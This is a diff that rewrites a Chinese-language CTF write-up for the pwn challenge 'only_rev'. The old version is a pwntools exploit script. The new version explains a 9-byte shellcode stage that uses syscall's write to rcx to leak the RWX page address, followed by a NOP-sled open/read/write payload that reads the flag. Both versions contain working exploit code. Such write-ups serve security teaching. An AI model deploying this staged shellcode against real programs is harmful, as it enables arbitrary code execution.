@@ -2,116 +2,57 @@
 
 ## 题目简述
 
-该题与 `only` 思路接近，关键是 syscall 后 `rcx` 中保留 RWX 段地址。利用 `mov rsi, rcx` 配合 syscall 获取 read primitive，再发送读取 flag 的 shellcode。
+`only_rev` 与 `only` 使用相同的隐藏入口：向 bookkeeping 输入原始位模式为 `0x0d0e0a0d0b0e0e0f` 的 double，即十进制 `8.5925645443139351e-246`，再选择隐藏菜单的“run your code”，可在一页 RWX 内存中执行最多 9 字节。前置 stub 会把通用寄存器清零，因而初始 `rax = rdi = rdx = 0`。
+
+本题的重点是只凭这 9 字节取得当前 RWX 页地址。仓库的 `Pwn/only_rev` 目录只有一份 TODO `README.md`，没有附件、源码或单题 WP；以下机制来自总 PDF 第 160 至 162 页，无法再用仓库源码交叉验证，且 PDF 未给出最终 flag 文本。
 
 ## 解题过程
 
-### 关键观察
+### 1. 利用 `syscall` 对 `rcx` 的副作用
 
-该题与 `only` 思路接近，关键是 syscall 后 `rcx` 中保留 RWX 段地址。
+x86-64 执行 `syscall` 时，CPU 会把下一条指令的地址保存到 `rcx`，把当前 RFLAGS 保存到 `r11`。这一硬件行为恰好能泄露正在执行的 RWX 代码地址。
 
-### 求解步骤
+第一阶段严格控制为 9 字节：
 
-和only并无区别，用syscall向rcx写入rwx段地址，传给rsi后syscall即可拿到read。
-p.sendlineafter(b"input:\n","8.5925645443139351e-246")
-p.sendlineafter(b"Make a choice:",b'1')
+```asm
+syscall           /* read(0, 0, 0)，不传数据，但 rcx = 下一条指令地址 */
+mov rsi, rcx      /* rsi 指向当前 RWX 页内 */
+mov dl, 0xff      /* rdx = 255 */
+syscall           /* read(0, rsi, 0xff) */
+```
 
-sc = '''
-    pop rdx
-    pop rsi
-    pop rdx
-    pop rsi
-    pop rsi
-    pop rsi
-    syscall
-'''
-sc = asm(sc)
-print(len(sc))
-dbg()
-p.sendafter(b"your code:", sc)
-sc2 = asm(shellcraft.open("/flag",0,0) + shellcraft.read(3, "rsp", 0x100) +
-shellcraft.write(1, "rsp", 0x100))
-pause()
-p.sendline(b'\x90'*0x100+sc2)
-p.interactive()
+对应长度为 `2 + 3 + 2 + 2 = 9`。第一次系统调用因为 `rax = rdi = rdx = 0`，等价于零长度 `read(0, NULL, 0)`，不会访问空指针；它的作用只是让 `rcx` 获得第一条 `syscall` 后方的 RIP。第二次系统调用则把最多 255 字节读到该地址。
 
-# import struct
+### 2. 原地覆盖为第二阶段
 
-# hex_val = 0x0D0E0A0D0B0E0E0F
+第二次 `read` 的目的地址位于第一阶段自身中间，会覆盖 `mov rsi, rcx` 之后的代码。覆盖发生在内核执行系统调用期间，返回 RIP 位于同一缓冲区稍后的位置；只要传入数据以足够长的 NOP sled 开头，返回后就会落入 NOP 并继续执行新载荷。
 
-# double_val = struct.unpack('d', struct.pack('Q', hex_val))[0]
+PDF 使用的第二阶段结构是：
 
+```python
+asm(
+    'nop;' * 0x40 +
+    'lea rsp, [rip+0x800];' +
+    shellcraft.open('flag', 0, 0) +
+    shellcraft.read('rax', 'rsp', 0x100) +
+    shellcraft.write(1, 'rsp', 0x100)
+)
+```
 
-# print("double value:", double_val)
-# print("as input string (17 sig digits):", format(double_val, ".17g"))
+`lea rsp, [rip+0x800]` 把栈迁入同一 RWX 映射的空闲区域，避免题目固定 stub 对原栈指针的平移影响后续 shellcode。之后以 `open/read/write` 读取相对路径 `flag`；若实际部署使用 `/flag`，只需同步替换路径。
 
-from pwn import *
-filename = './chal'
-# libc = ELF("./libc.so.6")
-host= '<challenge-host>'
-port= 26000
+### 3. 完整交互顺序
 
-sla = lambda x,s : p.sendlineafter(x,s)
-sl = lambda s : p.sendline(s)
-sa = lambda x,s : p.sendafter(x,s)
-s = lambda s : p.send(s)
-e = ELF(filename)
-context.log_level='debug'
-context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
-def run(mode, script = ""):
-    if "d" in mode:
-        p = gdb.debug(filename, script)
-    elif "l" in mode:
-        p = process(filename)
-    elif "r" in mode:
-        p = remote(host, port)
-    elif "a" in mode:
-        p = process(filename)
-        gdb.attach(p, script)
-    return p
+1. 进入 bookkeeping，发送 `8.5925645443139351e-246` 触发隐藏菜单。
+2. 选择执行代码，发送上述 9 字节第一阶段。
+3. 等待第一阶段进入第二个 `read`，一次性发送 NOP sled、栈迁移和 ORW。
+4. 第二次 `syscall` 返回到已被覆盖的 RWX 区，沿 NOP sled 执行第二阶段并输出 flag。
 
-def getp():
-    global script
-    if len(sys.argv) == 2:
-        p = run(sys.argv[1], script)
-    else:
-        p = run("l", script)
-    return p
-
-script = '''
-go
-'''
-def pwn():
-    global p
-    p = getp()
-
-    hex_value = 0xD0E0A0D0B0E0E0F
-    float_value = struct.unpack('d', struct.pack('Q', hex_value))[0]
-    print(f"The float value of 0x{hex_value:X} is: {float_value}")
-    sla('3.', '2')
-    sla('input', str(float_value))
-    sla(':', '1')
-    pause()
-    shellcode = '''
-syscall
-mov rsi, rcx
-mov dl, 0xff
-syscall
-'''
-    shellcode = asm(shellcode)
-    sa(':', shellcode)
-    sleep(0.5)
-
-### 跨页补回：第二阶段 shellcode 收尾
-
-s(asm('nop;'*0x40+'lea rsp, [rip+0x800];' + shellcraft.open('flag', 0, 0)
-+ shellcraft.read('rax', 'rsp', 0x100) + shellcraft.write(1, 'rsp', 0x100)))
-
-pwn()
-p.interactive()
+总 PDF 中还保留了另一份与 `only` 相同的 `pop rdx/pop rsi/.../syscall` 片段，但 `only_rev` 专属 exploit 使用的是 `syscall → rcx → rsi → syscall`，后者不需要猜平移后栈上的值，因果链也更完整。
 
 ## 方法总结
 
-- 核心技巧：利用 syscall 后寄存器副作用传递 RWX 地址。
-- 识别信号：`rcx` 保留可执行内存地址且后续可执行用户 shellcode。
-- 复用要点：先把 `rcx` 搬到 `rsi` 作为 read 缓冲区，再发送完整 shellcode。
+- `syscall` 不仅进入内核，还固定改写 `rcx` 和 `r11`；在极短 shellcode 场景中，零长度系统调用可作为两字节的 RIP 获取原语。
+- 初始寄存器清零使第一次调用安全地退化为 `read(0, NULL, 0)`，第二次再用 `rcx` 和 `dl` 补齐缓冲区与长度。
+- 第二阶段会原地覆盖第一阶段，必须用 NOP sled 覆盖系统调用返回位置，并在进入 ORW 前把 `rsp` 迁到确定可写的区域。
+- 由于仓库缺少该题附件和源码，偏移、flag 路径及运行稳定性只能以总 PDF 为证据，不能外推到其它构建。
